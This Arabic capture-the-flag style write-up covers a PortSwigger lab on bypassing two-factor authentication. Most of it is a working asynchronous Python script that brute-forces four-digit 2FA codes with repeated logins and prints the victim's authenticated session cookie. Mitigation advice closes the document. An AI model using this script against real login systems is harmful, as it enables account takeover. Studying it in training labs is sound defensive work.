# [2FA bypass using a brute-force attack](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack)

## **`الهدف`**
القيام بعمل `brute-force` علي كود الـ `2FA` الخاصة بحساب `carlos:montoya`وتسجيل الدخول بنجاح إلى حسابه.
## **`خطوات الحل`**
**`ملاحظة:`** خطوات الحل الرسمي من الـ `PortSwigger` تختلف عن الخطوات المكتوبة هنا لأنه يستعمل خاصية `macro` مع أداة `Burp Intruder`.

لحل هذا اللاب سنحتاج لكتابة سكريبت بايثون يقوم بعمل تسجيل دخول جديد بعد كل تجربة للكود، بمعنى أنه يقوم بتسجيل الدخول لحساب `carlos:montoya` ويجرب أحد الأكواد، ثم يعود ويقوم بتسجيل الدخول من جديد لتجربة أحد الاكواد وهكذا حتى يصل إلى الكود الصحيح، وقد نحتاج إلى إعادة تشغيل السكريبت بضعة مرات حتى نصل للكود الصحيح لأن الكود يتم تغييره كل عدة دقائق.

وعندها نصل للكود الصحيح سيقوم السكريبت بطباعة الـ `Session` الدائمة لحساب `carlos` فنقوم بالتوجه إلى اللاب وندخل إلى حساب `carlos:montoya` ونتوقف عند الصفحة التى تطلب منا إدخال كود الـ `2FA` ونضغط على زر `F12` في الكيبورد ونتوجه لخانة الـ `Cookies` ونغير الـ `Session` الموجودة بالـ `Session` التي حصلنا عليها في نهاية السكريبت وبعد ذلك نقوم بالتوجه إلى مسار `/my-account?id=carlos` لننتهي من حل اللاب.
## **`سكريبت الاستغلال`**
**نحتاج فقط إلى تعديل الـ `URL` الخاص باللاب في السكريبت لأنه يتغير كلما يُعاد الإتصال باللاب، ولا تنسى أن تشغيل السكريبت يتم من خلال الـ `Terminal` الخاص بـ `Linux` أو الـ `CMD/PowerShell` الخاص بـ `Windows`.**

**`ملاحظة:`** إن هذا السكريبت يعمل تلقائيًا بداية من تسجيل الدخول إلى حساب `carlos:montoya`، وحتى إدخال كود الـ `2FA` الصحيح، وأخيرًا طباعة الـ `Session` الدائمة الخاصة بحساب `carlos`.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import aiohttp
import re
import sys
import yarl
from datetime import datetime

# ======== الإعدادات ========
TARGET_URL = "https://0a8d003d04b151c382172939001c00f6.web-security-academy.net"  # غيّر الرابط
USERNAME = "carlos"
PASSWORD = "montoya"
CONCURRENT_LIMIT = 40
REQUEST_TIMEOUT = 5
# =============================

stop_event = asyncio.Event()
correct_code = None
correct_cookies = None       # هنخزن فيها الكوكيز الناجحة
print_lock = asyncio.Lock()

async def safe_print(*args):
    async with print_lock:
        print(f"[{datetime.now().strftime('%H:%M:%S')}]", *args)

def extract_csrf(html_text):
    match = re.search(r'<input[^>]*name=["\']csrf["\'][^>]*value=["\']([^"\']+)["\']', html_text, re.IGNORECASE)
    if not match:
        match = re.search(r'<input[^>]*value=["\']([^"\']+)["\'][^>]*name=["\']csrf["\']', html_text, re.IGNORECASE)
    return match.group(1) if match else None

async def login_and_get_2fa():
    """تسجيل دخول وارجاع (cookies, csrf_2fa)"""
    async with aiohttp.ClientSession() as session:
        async with session.get(f"{TARGET_URL}/login", timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)) as resp:
            html = await resp.text()
        csrf_login = extract_csrf(html)
        if not csrf_login:
            raise Exception("CSRF not found on login")
        data = {"csrf": csrf_login, "username": USERNAME, "password": PASSWORD}
        async with session.post(f"{TARGET_URL}/login", data=data, allow_redirects=True,
                                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)) as resp:
            if "/login2" not in str(resp.url):
                raise Exception("Login failed")
            html = await resp.text()
        csrf_2fa = extract_csrf(html)
        if not csrf_2fa:
            raise Exception("CSRF on /login2 not found")
        cookies = {k: v.value for k, v in session.cookie_jar.filter_cookies(yarl.URL(TARGET_URL)).items()}
        return cookies, csrf_2fa

async def try_code(code, semaphore):
    global correct_cookies
    if stop_event.is_set():
        return code, False

    async with semaphore:
        try:
            cookies, csrf_2fa = await login_and_get_2fa()
        except Exception as e:
            await safe_print(f"Code {code} -> LOGIN FAILED ({type(e).__name__})")
            return code, False

        try:
            async with aiohttp.ClientSession() as session:
                session.cookie_jar.update_cookies(cookies)
                data = {"csrf": csrf_2fa, "mfa-code": code}
                async with session.post(f"{TARGET_URL}/login2", data=data, allow_redirects=False,
                                        timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)) as resp:
                    status = resp.status
                    location = resp.headers.get("Location", "")
                    is_success = status in (301, 302) and (location == "/my-account" or location.startswith("/my-account?"))
                    if is_success:
                        await safe_print(f"Code {code} -> Login OK, MFA: {status} -> {location} (SUCCESS)  <== CORRECT")
                        # استخراج الكوكيز من الجلسة اللي نجحت (بعد ما اتبعت الكود الصحيح)
                        final_cookies = {k: v.value for k, v in session.cookie_jar.filter_cookies(yarl.URL(TARGET_URL)).items()}
                        correct_cookies = final_cookies
                        return code, True
                    else:
                        if location:
                            await safe_print(f"Code {code} -> Login OK, MFA: {status} -> {location} (fail)")
                        else:
                            await safe_print(f"Code {code} -> Login OK, MFA: {status} (fail)")
                        return code, False
        except Exception as e:
            await safe_print(f"Code {code} -> Login OK, MFA: REQUEST ERROR ({type(e).__name__})")
            return code, False

async def main():
    global correct_code, correct_cookies
    print("[*] 2FA Brute-Force (captures session on success)\n")
    semaphore = asyncio.Semaphore(CONCURRENT_LIMIT)

    tasks = []
    for i in range(10000):
        task = asyncio.create_task(try_code(f"{i:04d}", semaphore))
        tasks.append(task)

    for coro in asyncio.as_completed(tasks):
        code, success = await coro
        if success:
            correct_code = code
            stop_event.set()
            for t in tasks:
                t.cancel()
            break

    if not correct_code:
        print("[-] No valid code found.")
        return

    # طباعة الكوكيز الناجحة فوراً (بدون إعادة تسجيل دخول)
    print(f"\n[+] Correct 2FA Code: {correct_code}")
    if correct_cookies:
        print("======== SESSION COOKIE (authenticated) ========")
        for name, value in correct_cookies.items():
            print(f"{name}={value}")
        print("====================================================")
        print("[i] Use this session cookie in your browser and go to /my-account.")
    else:
        print("[-] Could not extract session cookie from successful attempt.")

if __name__ == "__main__":
    asyncio.run(main())
```
ولتشغيل السكريبت تحتاج إلى نسخ الكود إلى برنامج أو أداة نصوص مثل `Notepad` وحفظه بإمتداد `py` بأى إسم عشوائي، كمثال: `test` وتشغيله بإستخدام إحدي الأوامر التالية من داخل الـ `Terminal`
```shell
python test.py
أو
python3 test.py
```

## **`ترقيع الثغرة`**
يجب أن يراقب النظام عدد محاولات إدخال الـ `2FA` بشكل خاطئ على مستوى حساب المستخدم ككل بدلاً من أن يقوم بمراقبتها على مستوى الـ `Session` الواحدة فقط، بحيث إذا قام شخص بإدخال كود `2FA` خاطئ `3 أو 5` مرات (حتى لو قام بتسجيل الدخول من جديد في كل مرة)، يجب أن يقوم النظام بـ قفل الحساب مؤقتاً `(Account Lockout)` أو حظر إدخال أي أكواد `2FA` `لهذا` الحساب لمدة معينة `( 15 دقيقة مثلًا)`.

ويُفضل جعل كود الـ `2FA` يتكون من `6 أرقام (مليون احتمال)` أو حتي جعله يتكون من حروف وأرقام وليس أرقامًا فقط، لزيادة عدد الاحتمالات الممكنة حتى تصبح عملية التخمين شديدة صعوبة فى الوقت القصير المُتاح قبل انتهاء صلاحية الكود.

ويجب وضع حماية ضد كثرة الطلبات لأن الوضع الحالي للموقع هو `No Rate Limiting.`
